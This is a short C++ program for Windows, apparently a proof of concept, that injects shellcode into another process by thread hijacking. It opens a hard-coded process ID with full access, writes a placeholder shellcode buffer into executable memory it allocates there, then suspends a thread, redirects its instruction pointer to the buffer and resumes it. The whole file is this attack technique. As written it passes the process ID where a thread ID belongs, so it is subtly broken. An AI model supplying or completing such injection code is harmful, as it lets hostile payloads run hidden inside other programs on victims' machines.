#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

int main(int argc, char **argv)
{
    unsigned char shellcode[] = "<shellcode>";

    HANDLE targetProcess;
    PVOID remoteBuffer;
    HANDLE threadHijacked = NULL;
    HANDLE snapshot;
    THREADENTRY32 threadEntry;
    CONTEXT context;

    DWORD targetPID = 20880;
    context.ContextFlags = CONTEXT_FULL;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    remoteBuffer = VirtualAllocEx(targetProcess, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(targetProcess, remoteBuffer, shellcode, sizeof shellcode, NULL);

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    Thread32First(snapshot, &threadEntry);

    while (Thread32Next(snapshot, &threadEntry))
    {
        if (threadEntry.th32OwnerProcessID == targetPID)
        {
            threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32OwnerProcessID);
            break;
        }
    }

    SuspendThread(threadHijacked);

    GetThreadContext(threadHijacked, &context);
    context.Rip = (DWORD_PTR)remoteBuffer;
    SetThreadContext(threadHijacked, &context);

    ResumeThread(threadHijacked);
}